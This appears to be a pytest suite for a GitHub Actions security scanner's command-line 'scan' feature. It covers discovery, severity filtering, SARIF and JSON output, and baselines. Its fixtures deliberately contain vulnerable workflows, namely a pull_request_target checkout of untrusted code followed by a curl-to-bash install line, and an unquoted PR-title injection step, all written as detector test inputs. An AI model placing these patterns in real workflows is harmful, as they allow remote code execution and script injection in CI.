"""Tests for the headless ``actsense scan`` command."""
import io
import json
from pathlib import Path

import pytest

import cli
from rules import security as security_rules

VULNERABLE_WORKFLOW = """\
name: CI
on:
  pull_request_target:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@main
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: curl -sSL https://example.com/install.sh | bash
"""

SAFE_WORKFLOW = """\
name: Safe
on: [push]
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo hello
"""

COMPOSITE_ACTION = """\
name: Local
description: A local composite action
runs:
  using: composite
  steps:
    - uses: some/thing@main
    - run: echo "${{ inputs.name }}"
      shell: bash
inputs:
  name:
    description: name
"""


def _write(root: Path, rel: str, content: str) -> Path:
    path = root / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content)
    return path


def _run(*argv: str):
    out, err = io.StringIO(), io.StringIO()
    code = cli.main(list(argv), stdout=out, stderr=err)
    return code, out.getvalue(), err.getvalue()


@pytest.fixture
def repo(tmp_path: Path) -> Path:
    _write(tmp_path, ".github/workflows/ci.yml", VULNERABLE_WORKFLOW)
    _write(tmp_path, ".github/actions/local/action.yml", COMPOSITE_ACTION)
    _write(tmp_path, "node_modules/pkg/action.yml", COMPOSITE_ACTION)
    return tmp_path


class TestDiscover:
    def test_finds_workflows_and_actions(self, repo):
        found = cli.discover(repo)
        assert [p.name for p in found["workflows"]] == ["ci.yml"]
        assert [p.relative_to(repo).as_posix() for p in found["actions"]] == [".github/actions/local/action.yml"]

    def test_single_workflow_file(self, repo):
        found = cli.discover(repo / ".github/workflows/ci.yml")
        assert len(found["workflows"]) == 1 and not found["actions"]

    def test_single_action_file(self, repo):
        found = cli.discover(repo / ".github/actions/local/action.yml")
        assert len(found["actions"]) == 1 and not found["workflows"]


class TestScan:
    def test_text_output_and_fail_on_high(self, repo):
        code, out, _ = _run("scan", str(repo), "--repo", "o/r", "--no-color")
        assert code == cli.EXIT_FINDINGS
        assert ".github/workflows/ci.yml" in out
        assert "malicious_curl_pipe_bash" in out
        assert "https://actsense.dev/vulnerabilities/malicious_curl_pipe_bash" in out
        assert "Scanned 2 file(s)" in out

    def test_fail_on_none_exits_zero(self, repo):
        code, _, _ = _run("scan", str(repo), "--repo", "o/r", "--fail-on", "none")
        assert code == cli.EXIT_OK

    def test_safe_workflow_passes_fail_on_high(self, tmp_path):
        _write(tmp_path, ".github/workflows/safe.yml", SAFE_WORKFLOW)
        code, out, _ = _run("scan", str(tmp_path), "--repo", "o/r", "--fail-on", "high")
        assert code == cli.EXIT_OK
        assert "critical" not in out.lower()

    def test_min_severity_filters_report(self, repo):
        _, out, _ = _run("scan", str(repo), "--repo", "o/r", "-f", "json", "--min-severity", "critical")
        findings = json.loads(out)["findings"]
        assert findings and all(f["severity"] == "critical" for f in findings)

    def test_local_action_not_flagged_unpinned(self, repo):
        _, out, _ = _run("scan", str(repo), "--repo", "o/r", "-f", "json")
        action_findings = [f for f in json.loads(out)["findings"] if f["path"].endswith("action.yml")]
        types = {f["type"] for f in action_findings}
        assert "unpinnable_composite_subaction" in types
        assert "unpinned_version" not in types

    def test_skips_node_modules(self, repo):
        _, out, _ = _run("scan", str(repo), "--repo", "o/r", "-f", "json")
        assert not any("node_modules" in p for p in json.loads(out)["scanned"])

    def test_json_has_path_line_and_fingerprint(self, repo):
        _, out, _ = _run("scan", str(repo), "--repo", "o/r", "-f", "json")
        payload = json.loads(out)
        assert payload["errors"] == []
        for f in payload["findings"]:
            assert f["path"] and f["type"] and f["severity"] in cli.SEVERITIES
            assert len(f["fingerprint"]) == 20
        assert any(f["line"] for f in payload["findings"])

    def test_fingerprints_stable_across_runs(self, repo):
        _, a, _ = _run("scan", str(repo), "--repo", "o/r", "-f", "json")
        _, b, _ = _run("scan", str(repo), "--repo", "o/r", "-f", "json")
        fps = lambda s: sorted(f["fingerprint"] for f in json.loads(s)["findings"])  # noqa: E731
        assert fps(a) == fps(b)

    def test_invalid_yaml_is_a_warning(self, tmp_path):
        _write(tmp_path, ".github/workflows/bad.yml", "jobs: [unclosed\n")
        _write(tmp_path, ".github/workflows/safe.yml", SAFE_WORKFLOW)
        code, _, err = _run("scan", str(tmp_path), "--repo", "o/r")
        assert code == cli.EXIT_OK
        assert "bad.yml: could not parse workflow YAML" in err

    def test_empty_directory(self, tmp_path):
        code, out, err = _run("scan", str(tmp_path), "--repo", "o/r")
        assert code == cli.EXIT_OK
        assert "no workflows or action.yml files found" in err
        assert "no findings" in out

    def test_missing_path(self, tmp_path):
        code, _, err = _run("scan", str(tmp_path / "nope"))
        assert code == cli.EXIT_ERROR
        assert "no such file" in err

    def test_output_file(self, repo, tmp_path):
        target = tmp_path / "report.json"
        _, out, _ = _run("scan", str(repo), "--repo", "o/r", "-f", "json", "-o", str(target))
        assert out == ""
        assert json.loads(target.read_text())["findings"]


class TestSarif:
    @pytest.fixture
    def sarif(self, repo):
        _, out, _ = _run("scan", str(repo), "--repo", "o/r", "-f", "sarif")
        return json.loads(out)

    def test_envelope(self, sarif):
        assert sarif["version"] == "2.1.0"
        driver = sarif["runs"][0]["tool"]["driver"]
        assert driver["name"] == "actsense"
        assert driver["rules"]

    def test_rules_carry_docs_and_security_severity(self, sarif):
        for rule in sarif["runs"][0]["tool"]["driver"]["rules"]:
            assert rule["helpUri"] == f"https://actsense.dev/vulnerabilities/{rule['id']}"
            assert float(rule["properties"]["security-severity"]) > 0
            assert rule["defaultConfiguration"]["level"] in ("error", "warning", "note")

    def test_results_reference_known_rules_and_locations(self, sarif):
        run = sarif["runs"][0]
        rule_ids = {r["id"] for r in run["tool"]["driver"]["rules"]}
        assert run["results"]
        for res in run["results"]:
            assert res["ruleId"] in rule_ids
            loc = res["locations"][0]["physicalLocation"]
            assert loc["artifactLocation"]["uriBaseId"] == "%SRCROOT%"
            assert not loc["artifactLocation"]["uri"].startswith("/")
            assert loc["region"]["startLine"] >= 1
            assert res["partialFingerprints"]["actsenseFingerprint/v1"]

    def test_critical_maps_to_error(self, sarif):
        crit = [r for r in sarif["runs"][0]["results"] if r["properties"]["severity"] == "critical"]
        assert crit and all(r["level"] == "error" for r in crit)


def test_local_refs_are_not_unpinned():
    assert security_rules.check_pinned_version("./.github/actions/x") is None
    assert security_rules.check_pinned_version("actions/checkout@main") is not None


def _git(cwd: Path, *args: str) -> None:
    import subprocess
    subprocess.run(
        ["git", "-c", "user.name=t", "-c", "user.email=t@t", "-c", "commit.gpgsign=false", *args],
        cwd=cwd, check=True, capture_output=True,
    )


NEW_INJECTION_STEP = """\
      - run: echo "${{ github.event.pull_request.title }}"
"""


class TestBaseline:
    def test_write_then_apply_baseline(self, repo, tmp_path):
        base_file = tmp_path / "baseline.json"
        code, _, err = _run("scan", str(repo), "--repo", "o/r", "--write-baseline", str(base_file))
        assert code == cli.EXIT_OK and "wrote" in err
        doc = json.loads(base_file.read_text())
        assert doc["actsense_baseline"] == 1 and doc["findings"]

        code, out, _ = _run("scan", str(repo), "--repo", "o/r", "--baseline", str(base_file), "--fail-on", "low")
        assert code == cli.EXIT_OK
        assert "0 new finding(s)" in out

    def test_new_finding_fails_against_baseline(self, repo, tmp_path):
        base_file = tmp_path / "baseline.json"
        _run("scan", str(repo), "--repo", "o/r", "--write-baseline", str(base_file))
        wf = repo / ".github/workflows/ci.yml"
        wf.write_text(wf.read_text() + NEW_INJECTION_STEP)

        code, out, _ = _run("scan", str(repo), "--repo", "o/r", "-f", "json", "--baseline", str(base_file))
        assert code == cli.EXIT_FINDINGS
        payload = json.loads(out)
        new = [f for f in payload["findings"] if f["new"]]
        assert new
        assert any(not f["new"] for f in payload["findings"])

    def test_json_report_works_as_baseline(self, repo, tmp_path):
        report = tmp_path / "report.json"
        _run("scan", str(repo), "--repo", "o/r", "-f", "json", "-o", str(report))
        code, _, _ = _run("scan", str(repo), "--repo", "o/r", "--baseline", str(report), "--fail-on", "low")
        assert code == cli.EXIT_OK

    def test_moved_lines_keep_identity(self, repo, tmp_path):
        base_file = tmp_path / "baseline.json"
        _run("scan", str(repo), "--repo", "o/r", "--write-baseline", str(base_file))
        wf = repo / ".github/workflows/ci.yml"
        wf.write_text("# a comment that shifts every line\n\n" + wf.read_text())
        code, _, _ = _run("scan", str(repo), "--repo", "o/r", "--baseline", str(base_file), "--fail-on", "low")
        assert code == cli.EXIT_OK

    def test_duplicate_findings_counted(self):
        issue = {"type": "x", "severity": "high", "message": "m"}
        findings = [cli.Finding("a.yml", dict(issue)) for _ in range(2)]
        from baseline import mark_new
        from collections import Counter
        mark_new(findings, Counter([findings[0].fingerprint]))
        assert [f.new for f in findings] == [False, True]

    def test_unreadable_baseline_is_usage_error(self, repo, tmp_path):
        code, _, err = _run("scan", str(repo), "--baseline", str(tmp_path / "missing.json"))
        assert code == cli.EXIT_ERROR and "cannot read baseline" in err

    def test_sarif_baseline_state(self, repo, tmp_path):
        base_file = tmp_path / "baseline.json"
        _run("scan", str(repo), "--repo", "o/r", "--write-baseline", str(base_file))
        wf = repo / ".github/workflows/ci.yml"
        wf.write_text(wf.read_text() + NEW_INJECTION_STEP)
        _, out, _ = _run("scan", str(repo), "--repo", "o/r", "-f", "sarif", "--baseline", str(base_file))
        states = {r["baselineState"] for r in json.loads(out)["runs"][0]["results"]}
        assert states == {"new", "unchanged"}


class TestDiffBase:
    @pytest.fixture
    def git_repo(self, repo):
        _git(repo, "init", "-q", "-b", "main")
        _git(repo, "add", "-A")
        _git(repo, "commit", "-qm", "base")
        return repo

    def test_unchanged_tree_has_no_new_findings(self, git_repo):
        code, out, _ = _run("scan", str(git_repo), "--repo", "o/r", "--diff-base", "HEAD", "--fail-on", "low")
        assert code == cli.EXIT_OK, out
        assert "0 new finding(s)" in out

    def test_only_introduced_findings_fail(self, git_repo):
        wf = git_repo / ".github/workflows/ci.yml"
        wf.write_text(wf.read_text() + NEW_INJECTION_STEP)
        code, out, _ = _run("scan", str(git_repo), "--repo", "o/r", "-f", "json", "--diff-base", "HEAD")
        assert code == cli.EXIT_FINDINGS
        payload = json.loads(out)
        assert payload["baseline"] == "HEAD"
        assert {f["new"] for f in payload["findings"]} == {True, False}

    def test_new_workflow_file_is_all_new(self, git_repo):
        _write(git_repo, ".github/workflows/new.yml", VULNERABLE_WORKFLOW)
        _, out, _ = _run("scan", str(git_repo), "--repo", "o/r", "-f", "json", "--diff-base", "HEAD")
        new_paths = {f["path"] for f in json.loads(out)["findings"] if f["new"]}
        assert new_paths == {".github/workflows/new.yml"}

    def test_scan_subdirectory(self, git_repo):
        _write(git_repo, "sub/action.yml", COMPOSITE_ACTION)
        _git(git_repo, "add", "-A")
        _git(git_repo, "commit", "-qm", "sub")
        code, out, _ = _run("scan", str(git_repo / "sub"), "--repo", "o/r", "--diff-base", "HEAD", "--fail-on", "low")
        assert code == cli.EXIT_OK, out

    def test_unknown_ref_is_usage_error(self, git_repo):
        code, _, err = _run("scan", str(git_repo), "--repo", "o/r", "--diff-base", "no-such-ref")
        assert code == cli.EXIT_ERROR and "cannot resolve git ref" in err

    def test_not_a_git_repo(self, tmp_path):
        _write(tmp_path, ".github/workflows/ci.yml", SAFE_WORKFLOW)
        code, _, err = _run("scan", str(tmp_path), "--repo", "o/r", "--diff-base", "HEAD")
        assert code == cli.EXIT_ERROR and "not inside a git repository" in err


class TestMarkdownAndSarifPaths:
    def test_summary_file(self, repo, tmp_path):
        summary = tmp_path / "summary.md"
        _run("scan", str(repo), "--repo", "o/r", "--summary-file", str(summary))
        text = summary.read_text()
        assert text.startswith("## actsense")
        assert "| Severity | Finding | Location |" in text
        assert "https://actsense.dev/vulnerabilities/" in text

    def test_sarif_uris_relative_to_workspace(self, repo, monkeypatch):
        monkeypatch.chdir(repo.parent)
        _, out, _ = _run("scan", str(repo), "--repo", "o/r", "-f", "sarif")
        uris = {r["locations"][0]["physicalLocation"]["artifactLocation"]["uri"]
                for r in json.loads(out)["runs"][0]["results"]}
        assert all(u.startswith(f"{repo.name}/") for u in uris)


def test_gitignored_files_are_skipped(repo):
    _git(repo, "init", "-q")
    (repo / ".gitignore").write_text(".github/actions/\n")
    found = cli.discover(repo)
    assert found["actions"] == []
    assert [p.name for p in found["workflows"]] == ["ci.yml"]
